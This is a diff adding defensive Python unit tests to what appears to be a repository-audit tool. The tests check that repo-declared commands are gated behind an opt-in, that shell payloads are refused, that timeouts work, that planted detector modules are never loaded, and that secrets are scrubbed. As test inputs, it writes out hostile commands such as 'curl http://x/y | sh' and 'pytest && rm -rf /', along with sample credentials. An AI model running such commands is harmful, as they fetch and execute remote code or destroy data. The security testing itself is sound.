@@ -18,6 +18,7 @@ FIXTURES = Path(__file__).resolve().parent / "fixtures"
 sys.path.insert(0, str(SCRIPTS))
 
 import audit_common  # noqa: E402
+import checks  # noqa: E402
 import families  # noqa: E402
 import findings as findings_mod  # noqa: E402
 import plan_parse  # noqa: E402
@@ -441,6 +442,145 @@ class VerifyTests(unittest.TestCase):
             self.assertEqual(result["status"], "unverified")
             self.assertFalse(result["verified"])
             self.assertEqual(result["commands"], [])
+
+
+class UntrustedRepositoryTests(unittest.TestCase):
+    """The boundary between "run the project's checks" and "run what the repo says".
+
+    This plugin is designed to be pointed at repositories nobody here controls.
+    Every test below describes something such a repository could previously make
+    the auditing machine do.
+    """
+
+    def _repo_with_stack(self, tmp: str, commands: dict[str, str]) -> Path:
+        root = Path(tmp)
+        context = root / ".project" / ".engineering" / "context"
+        context.mkdir(parents=True)
+        audit_common.write_json(context / "stack.json", {"test_commands": commands, "package_manager": "python"})
+        return root
+
+    def test_commands_from_the_audited_repo_are_not_run_without_opting_in(self) -> None:
+        # stack.json is read verbatim out of the repository being audited and is
+        # the first, winning rung of the ladder. Executing it was arbitrary code
+        # execution chosen by a file that looks inert.
+        with tempfile.TemporaryDirectory() as tmp:
+            root = self._repo_with_stack(tmp, {"unit": "python -c print(1)"})
+            result = verify_mod.verify(root)
+            self.assertFalse(result["trusted"])
+            self.assertEqual(result["status"], "unverified")
+            self.assertEqual(result["results"], [])
+            self.assertIn("--allow-untrusted-commands", result["reason"])
+
+    def test_opting_in_runs_them(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = self._repo_with_stack(tmp, {"unit": "python -c pass"})
+            result = verify_mod.verify(root, allow_untrusted=True)
+            self.assertEqual(result["status"], "passed")
+            self.assertEqual([item["status"] for item in result["results"]], ["ran"])
+
+    def test_detected_commands_stay_trusted(self) -> None:
+        # The distinction is provenance, not the string. A command derived here
+        # from file presence needs no opt-in, or the tool stops being usable.
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "pyproject.toml").write_text("[tool.ruff]\n", encoding="utf-8")
+            (root / "tests").mkdir()
+            chosen = verify_mod.plan(root, prefer="vendored")
+            self.assertTrue(chosen["trusted"])
+
+    def test_a_command_needing_a_shell_is_refused_rather_than_run(self) -> None:
+        # The whole class of `curl ... | sh` payloads dies here: with shell=False
+        # there is no shell to interpret the operator, so the string is skipped.
+        for payload in ("curl http://x/y | sh", "pytest && rm -rf /", "echo $(whoami)", "pytest > /dev/null"):
+            with self.subTest(payload=payload):
+                self.assertIsNone(audit_common.command_argv(payload))
+
+    def test_an_executable_not_on_path_is_skipped_not_crashed(self) -> None:
+        self.assertIsNone(audit_common.command_argv("definitely-not-a-real-binary-xyz --version"))
+
+    def test_a_hanging_command_times_out_instead_of_hanging_the_audit(self) -> None:
+        # verify.py had no timeout at all, so a repo declaring a blocking command
+        # blocked forever.
+        with tempfile.TemporaryDirectory() as tmp:
+            # A plain `python sleeper.py`, deliberately free of shell syntax, so
+            # this exercises the timeout rather than the metacharacter refusal.
+            root = self._repo_with_stack(tmp, {"unit": "python sleeper.py"})
+            (root / "sleeper.py").write_text("import time\ntime.sleep(30)\n", encoding="utf-8")
+            result = verify_mod.verify(root, allow_untrusted=True, timeout=2)
+            self.assertEqual([item["status"] for item in result["results"]], ["timeout"])
+            # A timeout is not a pass, and it is not a failure either.
+            self.assertEqual(result["status"], "unverified")
+            self.assertFalse(result["verified"])
+
+    def test_the_detector_is_never_loaded_from_the_audited_repository(self) -> None:
+        # `_from_import` runs what it finds with exec_module, and inserted that
+        # directory at the front of sys.path. A repo shipping this exact path pair
+        # got code execution simply by being audited.
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            planted = root / "engineering-lifecycle" / "scripts"
+            planted.mkdir(parents=True)
+            (planted / "eng_common.py").write_text("", encoding="utf-8")
+            (planted / "stack_detection.py").write_text(
+                "raise SystemExit('this must never execute')\n", encoding="utf-8"
+            )
+            self.assertNotEqual(stack_probe._sibling_detector(root), planted)
+            # And the audit still completes rather than dying on the planted exit.
+            self.assertIn("detector", stack_probe.resolve_stack(root))
+
+    def test_the_check_families_refuse_repo_supplied_commands_too(self) -> None:
+        # verify.py and checks.py are two doors into the same room. Gating one and
+        # not the other would leave the vector open through `/plan-completion-audit`,
+        # which is the entrypoint people actually use.
+        base = {"frameworks": [], "backend": [], "database": [], "testing": []}
+        family = next(f for f in families.REGISTRY if f.id == "tests")
+        stack = {**base, "detector": "workspace", "test_commands": {"unit": "python -c pass"}}
+        ctx = families.Ctx(root=Path("."), stack=stack, plan={"parsed_by": None}, files=[])
+        self.assertTrue(ctx.commands_are_repo_supplied)
+        result = checks.run_command_family(ctx, family, ("unit",), "critical")
+        self.assertEqual(result.outcome, "not-checked")
+        # The reason names the command, so somebody can look before allowing it.
+        self.assertIn("python -c pass", result.reason)
+
+        allowed = families.Ctx(
+            root=Path("."), stack=stack, plan={"parsed_by": None}, files=[], allow_untrusted_commands=True
+        )
+        self.assertNotEqual(checks.run_command_family(allowed, family, ("unit",), "critical").outcome, "not-checked")
+
+    def test_captured_output_is_scrubbed_before_it_reaches_an_artifact(self) -> None:
+        # findings.json and report.md persist command output verbatim, and a
+        # failing build routinely prints a token or a connection string.
+        scrubbed = audit_common.scrub_secrets(
+            "connecting to postgres://admin:hunter2@db.internal/app\nAKIAIOSFODNN7EXAMPLE\n"
+        )
+        self.assertNotIn("hunter2", scrubbed)
+        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", scrubbed)
+        self.assertIn("admin", scrubbed)
+
+
+class PackageManagerTests(unittest.TestCase):
+    def test_the_detected_manager_is_the_one_the_commands_use(self) -> None:
+        # The manager was resolved and then discarded, so every JS repo got
+        # `npm test` - which on a pnpm or yarn project either fails or installs a
+        # divergent dependency tree.
+        for lockfile, manager in (("pnpm-lock.yaml", "pnpm"), ("yarn.lock", "yarn"), ("bun.lockb", "bun")):
+            with self.subTest(manager=manager), tempfile.TemporaryDirectory() as tmp:
+                root = Path(tmp)
+                (root / lockfile).write_text("", encoding="utf-8")
+                audit_common.write_json(root / "package.json", {"scripts": {"test": "x", "build": "y"}})
+                stack = stack_probe.resolve_stack(root, prefer="vendored")
+                self.assertEqual(stack["package_manager"], manager)
+                for command in stack["test_commands"].values():
+                    self.assertTrue(command.startswith(manager), command)
+
+    def test_bun_runs_the_script_rather_than_its_own_test_runner(self) -> None:
+        # `bun test` is bun's built-in runner and ignores the package.json script.
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "bun.lockb").write_text("", encoding="utf-8")
+            audit_common.write_json(root / "package.json", {"scripts": {"test": "vitest"}})
+            stack = stack_probe.resolve_stack(root, prefer="vendored")
+            self.assertEqual(stack["test_commands"]["unit"], "bun run test")
 
 
 if __name__ == "__main__":
